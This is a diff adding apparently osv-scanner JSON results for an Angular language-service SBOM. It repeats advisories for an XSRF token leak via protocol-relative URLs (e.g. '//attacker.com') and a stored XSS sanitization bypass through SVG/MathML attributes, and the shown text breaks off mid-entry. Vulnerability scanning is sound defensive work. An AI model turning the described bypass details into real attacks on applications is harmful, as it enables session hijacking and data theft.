@@ -1,0 +1,1949 @@
+Warning: --sbom has been deprecated in favor of -L
+{
+  "results": [
+    {
+      "source": {
+        "path": "/sboms/angular__vscode-ng-language-service.spdx.json",
+        "type": "sbom"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "@angular/common",
+            "version": "12.2.16",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-58c5-g7wp-6w37"
+              ],
+              "aliases": [
+                "CVE-2025-66035",
+                "GHSA-58c5-g7wp-6w37"
+              ],
+              "max_severity": "7.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "21.0.0-next.0"
+                        },
+                        {
+                          "fixed": "21.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "20.0.0-next.0"
+                        },
+                        {
+                          "fixed": "20.3.14"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "19.2.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66035"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-201",
+                  "CWE-359"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-26T23:18:50Z",
+                "nvd_published_at": "2025-11-26T23:15:49Z",
+                "severity": "HIGH"
+              },
+              "details": "The vulnerability is a **Credential Leak by App Logic** that leads to the **unauthorized disclosure of the Cross-Site Request Forgery (XSRF) token** to an attacker-controlled domain.\n\nAngular's HttpClient has a built-in XSRF protection mechanism that works by checking if a request URL starts with a protocol (`http://` or `https://`) to determine if it is cross-origin. If the URL starts with protocol-relative URL (`//`), it is incorrectly treated as a same-origin request, and the XSRF token is automatically added to the `X-XSRF-TOKEN` header.\n\n### Impact\nThe token leakage completely bypasses Angular's built-in CSRF protection, allowing an attacker to capture the user's valid XSRF token. Once the token is obtained, the attacker can perform arbitrary Cross-Site Request Forgery (CSRF) attacks against the victim user's session.\n\n### Attack Preconditions\n1. The victim's Angular application must have **XSRF protection enabled**.  \n2. The attacker must be able to make the application send a state-changing HTTP request (e.g., `POST`) to a **protocol-relative URL**  (e.g., `//attacker.com`) that they control.\n\n### Patches\n- 19.2.16\n- 20.3.14\n- 21.0.1\n\n### Workarounds\nDevelopers should avoid using protocol-relative URLs (URLs starting with `//`) in HttpClient requests. All backend communication URLs should be hardcoded as relative paths (starting with a single `/`) or fully qualified, trusted absolute URLs.",
+              "id": "GHSA-58c5-g7wp-6w37",
+              "modified": "2025-12-01T16:21:36.319696Z",
+              "published": "2025-11-26T23:18:50Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/security/advisories/GHSA-58c5-g7wp-6w37"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66035"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/0276479e7d0e280e0f8d26fa567d3b7aa97a516f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/05fe6686a97fa0bcd3cf157805b3612033f975bc"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/3240d856d942727372a705252f7c8c115394a41e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/angular/angular"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/19.2.16"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/20.3.14"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/21.0.1"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Angular is Vulnerable to XSRF Token Leakage via Protocol-Relative URLs in Angular HTTP Client"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "@angular/common",
+            "version": "13.3.9",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-58c5-g7wp-6w37"
+              ],
+              "aliases": [
+                "CVE-2025-66035",
+                "GHSA-58c5-g7wp-6w37"
+              ],
+              "max_severity": "7.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "21.0.0-next.0"
+                        },
+                        {
+                          "fixed": "21.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "20.0.0-next.0"
+                        },
+                        {
+                          "fixed": "20.3.14"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "19.2.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66035"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-201",
+                  "CWE-359"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-26T23:18:50Z",
+                "nvd_published_at": "2025-11-26T23:15:49Z",
+                "severity": "HIGH"
+              },
+              "details": "The vulnerability is a **Credential Leak by App Logic** that leads to the **unauthorized disclosure of the Cross-Site Request Forgery (XSRF) token** to an attacker-controlled domain.\n\nAngular's HttpClient has a built-in XSRF protection mechanism that works by checking if a request URL starts with a protocol (`http://` or `https://`) to determine if it is cross-origin. If the URL starts with protocol-relative URL (`//`), it is incorrectly treated as a same-origin request, and the XSRF token is automatically added to the `X-XSRF-TOKEN` header.\n\n### Impact\nThe token leakage completely bypasses Angular's built-in CSRF protection, allowing an attacker to capture the user's valid XSRF token. Once the token is obtained, the attacker can perform arbitrary Cross-Site Request Forgery (CSRF) attacks against the victim user's session.\n\n### Attack Preconditions\n1. The victim's Angular application must have **XSRF protection enabled**.  \n2. The attacker must be able to make the application send a state-changing HTTP request (e.g., `POST`) to a **protocol-relative URL**  (e.g., `//attacker.com`) that they control.\n\n### Patches\n- 19.2.16\n- 20.3.14\n- 21.0.1\n\n### Workarounds\nDevelopers should avoid using protocol-relative URLs (URLs starting with `//`) in HttpClient requests. All backend communication URLs should be hardcoded as relative paths (starting with a single `/`) or fully qualified, trusted absolute URLs.",
+              "id": "GHSA-58c5-g7wp-6w37",
+              "modified": "2025-12-01T16:21:36.319696Z",
+              "published": "2025-11-26T23:18:50Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/security/advisories/GHSA-58c5-g7wp-6w37"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66035"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/0276479e7d0e280e0f8d26fa567d3b7aa97a516f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/05fe6686a97fa0bcd3cf157805b3612033f975bc"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/3240d856d942727372a705252f7c8c115394a41e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/angular/angular"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/19.2.16"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/20.3.14"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/21.0.1"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Angular is Vulnerable to XSRF Token Leakage via Protocol-Relative URLs in Angular HTTP Client"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "@angular/common",
+            "version": "18.1.0-rc.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-58c5-g7wp-6w37"
+              ],
+              "aliases": [
+                "CVE-2025-66035",
+                "GHSA-58c5-g7wp-6w37"
+              ],
+              "max_severity": "7.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "21.0.0-next.0"
+                        },
+                        {
+                          "fixed": "21.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "20.0.0-next.0"
+                        },
+                        {
+                          "fixed": "20.3.14"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "19.2.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66035"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-201",
+                  "CWE-359"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-26T23:18:50Z",
+                "nvd_published_at": "2025-11-26T23:15:49Z",
+                "severity": "HIGH"
+              },
+              "details": "The vulnerability is a **Credential Leak by App Logic** that leads to the **unauthorized disclosure of the Cross-Site Request Forgery (XSRF) token** to an attacker-controlled domain.\n\nAngular's HttpClient has a built-in XSRF protection mechanism that works by checking if a request URL starts with a protocol (`http://` or `https://`) to determine if it is cross-origin. If the URL starts with protocol-relative URL (`//`), it is incorrectly treated as a same-origin request, and the XSRF token is automatically added to the `X-XSRF-TOKEN` header.\n\n### Impact\nThe token leakage completely bypasses Angular's built-in CSRF protection, allowing an attacker to capture the user's valid XSRF token. Once the token is obtained, the attacker can perform arbitrary Cross-Site Request Forgery (CSRF) attacks against the victim user's session.\n\n### Attack Preconditions\n1. The victim's Angular application must have **XSRF protection enabled**.  \n2. The attacker must be able to make the application send a state-changing HTTP request (e.g., `POST`) to a **protocol-relative URL**  (e.g., `//attacker.com`) that they control.\n\n### Patches\n- 19.2.16\n- 20.3.14\n- 21.0.1\n\n### Workarounds\nDevelopers should avoid using protocol-relative URLs (URLs starting with `//`) in HttpClient requests. All backend communication URLs should be hardcoded as relative paths (starting with a single `/`) or fully qualified, trusted absolute URLs.",
+              "id": "GHSA-58c5-g7wp-6w37",
+              "modified": "2025-12-01T16:21:36.319696Z",
+              "published": "2025-11-26T23:18:50Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/security/advisories/GHSA-58c5-g7wp-6w37"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66035"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/0276479e7d0e280e0f8d26fa567d3b7aa97a516f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/05fe6686a97fa0bcd3cf157805b3612033f975bc"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/3240d856d942727372a705252f7c8c115394a41e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/angular/angular"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/19.2.16"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/20.3.14"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/21.0.1"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Angular is Vulnerable to XSRF Token Leakage via Protocol-Relative URLs in Angular HTTP Client"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "@angular/common",
+            "version": "18.2.10",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-58c5-g7wp-6w37"
+              ],
+              "aliases": [
+                "CVE-2025-66035",
+                "GHSA-58c5-g7wp-6w37"
+              ],
+              "max_severity": "7.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "21.0.0-next.0"
+                        },
+                        {
+                          "fixed": "21.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "20.0.0-next.0"
+                        },
+                        {
+                          "fixed": "20.3.14"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-58c5-g7wp-6w37/GHSA-58c5-g7wp-6w37.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/common",
+                    "purl": "pkg:npm/%40angular/common"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "19.2.16"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66035"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-201",
+                  "CWE-359"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-26T23:18:50Z",
+                "nvd_published_at": "2025-11-26T23:15:49Z",
+                "severity": "HIGH"
+              },
+              "details": "The vulnerability is a **Credential Leak by App Logic** that leads to the **unauthorized disclosure of the Cross-Site Request Forgery (XSRF) token** to an attacker-controlled domain.\n\nAngular's HttpClient has a built-in XSRF protection mechanism that works by checking if a request URL starts with a protocol (`http://` or `https://`) to determine if it is cross-origin. If the URL starts with protocol-relative URL (`//`), it is incorrectly treated as a same-origin request, and the XSRF token is automatically added to the `X-XSRF-TOKEN` header.\n\n### Impact\nThe token leakage completely bypasses Angular's built-in CSRF protection, allowing an attacker to capture the user's valid XSRF token. Once the token is obtained, the attacker can perform arbitrary Cross-Site Request Forgery (CSRF) attacks against the victim user's session.\n\n### Attack Preconditions\n1. The victim's Angular application must have **XSRF protection enabled**.  \n2. The attacker must be able to make the application send a state-changing HTTP request (e.g., `POST`) to a **protocol-relative URL**  (e.g., `//attacker.com`) that they control.\n\n### Patches\n- 19.2.16\n- 20.3.14\n- 21.0.1\n\n### Workarounds\nDevelopers should avoid using protocol-relative URLs (URLs starting with `//`) in HttpClient requests. All backend communication URLs should be hardcoded as relative paths (starting with a single `/`) or fully qualified, trusted absolute URLs.",
+              "id": "GHSA-58c5-g7wp-6w37",
+              "modified": "2025-12-01T16:21:36.319696Z",
+              "published": "2025-11-26T23:18:50Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/security/advisories/GHSA-58c5-g7wp-6w37"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66035"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/0276479e7d0e280e0f8d26fa567d3b7aa97a516f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/05fe6686a97fa0bcd3cf157805b3612033f975bc"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/3240d856d942727372a705252f7c8c115394a41e"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/angular/angular"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/19.2.16"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/20.3.14"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/releases/tag/21.0.1"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Angular is Vulnerable to XSRF Token Leakage via Protocol-Relative URLs in Angular HTTP Client"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "@angular/compiler",
+            "version": "12.2.16",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-v4hv-rgfq-gp49"
+              ],
+              "aliases": [
+                "CVE-2025-66412",
+                "GHSA-v4hv-rgfq-gp49"
+              ],
+              "max_severity": "8.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "21.0.0-next.0"
+                        },
+                        {
+                          "fixed": "21.0.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "20.0.0-next.0"
+                        },
+                        {
+                          "fixed": "20.3.15"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "19.0.0-next.0"
+                        },
+                        {
+                          "fixed": "19.2.17"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "last_affected": "18.2.14"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66412"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-12-02T01:20:30Z",
+                "nvd_published_at": "2025-12-01T23:15:53Z",
+                "severity": "HIGH"
+              },
+              "details": "A **Stored Cross-Site Scripting ([XSS](https://angular.dev/best-practices/security#preventing-cross-site-scripting-xss))** vulnerability has been identified in the **Angular Template Compiler**. It occurs because the compiler's internal security schema is incomplete, allowing attackers to bypass Angular's built-in security sanitization. Specifically, the schema fails to classify certain URL-holding attributes (e.g., those that could contain [`javascript:` URLs](https://developer.mozilla.org/en-US/Web/URI/Reference/Schemes/javascript)) as requiring strict URL security, enabling the injection of malicious scripts.\n\nAdditionally, a related vulnerability exists involving SVG animation elements (`\u003canimate\u003e`, `\u003cset\u003e`, `\u003canimateMotion\u003e`, `\u003canimateTransform\u003e`). The `attributeName` attribute on these elements was not properly validated, allowing attackers to dynamically target security-sensitive attributes like `href` or `xlink:href` on other elements. By binding `attributeName` to \"href\" and providing a `javascript:` URL in the `values` or `to` attribute, an attacker could bypass sanitization and execute arbitrary code.\n\nAttributes confirmed to be vulnerable include:\n*   SVG-related attributes: (e.g., `xlink:href`), and various MathML attributes (e.g., `math|href`, `annotation|href`).\n*   SVG animation `attributeName` attribute when bound to \"href\" or \"xlink:href\".\n\nWhen template binding is used to assign untrusted, user-controlled data to these attributes (e.g., `[attr.xlink:href]=\"maliciousURL\"` or `\u003canimate [attributeName]=\"'href'\" [values]=\"maliciousURL\"\u003e`), the compiler incorrectly falls back to a non-sanitizing context or fails to block the dangerous attribute assignment. This allows an attacker to inject a `javascript:URL` payload. Upon user interaction (like a click) on the element, or automatically in the case of animations, the malicious JavaScript executes in the context of the application's origin.\n\n### Impact\n\nWhen exploited, this vulnerability allows an attacker to execute arbitrary code within the context of the vulnerable application's domain. This enables:\n\n* **Session Hijacking:** Stealing session cookies and authentication tokens.  \n* **Data Exfiltration:** Capturing and transmitting sensitive user data.  \n* **Unauthorized Actions:** Performing actions on behalf of the user.\n\n### Patches\n\n- 19.2.17\n- 20.3.15\n- 21.0.2\n\n### Attack Preconditions\n\n* The victim's Angular application must render data derived from **untrusted input** (e.g., from a database or API) and bind it to one of the unsanitized URL attributes or the `attributeName` of an SVG animation element.\n* The victim must perform a **user interaction** (e.g., clicking) on the compromised element for the stored script to execute, or the animation must trigger the execution.\n\n### Workarounds\n\nIf you cannot upgrade, you can workaround the issue by ensuring that any data bound to the vulnerable attributes is never sourced from untrusted user input (e.g., database, API response, URL parameters).\n\n* **Avoid Affected Template Bindings:** Specifically avoid using template bindings (e.g., `[attr.xlink:href]=\"maliciousURL\"`) to assign untrusted data to the vulnerable SVG/MathML attributes.\n* **Avoid Dynamic `attributeName` on SVG Animations:** Do not bind untrusted data to the `attributeName` attribute of SVG animation elements (`\u003canimate\u003e`, `\u003cset\u003e`, etc.).\n* **Enable [Content Security Policy (CSP)](https://angular.dev/best-practices/security#content-security-policy):** Configure a robust CSP header that disallows `javascript:` URLs.",
+              "id": "GHSA-v4hv-rgfq-gp49",
+              "modified": "2025-12-02T01:38:38.792648Z",
+              "published": "2025-12-02T01:20:30Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/security/advisories/GHSA-v4hv-rgfq-gp49"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66412"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/angular/angular/commit/1c6b0704fb63d051fab8acff84d076abfbc4893a"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/angular/angular"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Angular Stored XSS Vulnerability via SVG Animation, SVG URL and MathML Attributes"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "@angular/compiler",
+            "version": "13.3.9",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-v4hv-rgfq-gp49"
+              ],
+              "aliases": [
+                "CVE-2025-66412",
+                "GHSA-v4hv-rgfq-gp49"
+              ],
+              "max_severity": "8.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "21.0.0-next.0"
+                        },
+                        {
+                          "fixed": "21.0.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "20.0.0-next.0"
+                        },
+                        {
+                          "fixed": "20.3.15"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@angular/compiler",
+                    "purl": "pkg:npm/%40angular/compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "19.0.0-next.0"
+                        },
+                        {
+                          "fixed": "19.2.17"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-v4hv-rgfq-gp49/GHSA-v4hv-rgfq-gp49.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
